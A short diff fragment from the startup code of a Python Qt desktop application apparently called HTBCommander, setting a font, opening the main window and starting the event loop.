     if font_id != -1:
         app.setFont(QFont("Iosevka Nerd Font"))
-
     window = HTBCommander()
     window.show()
     app.exec()
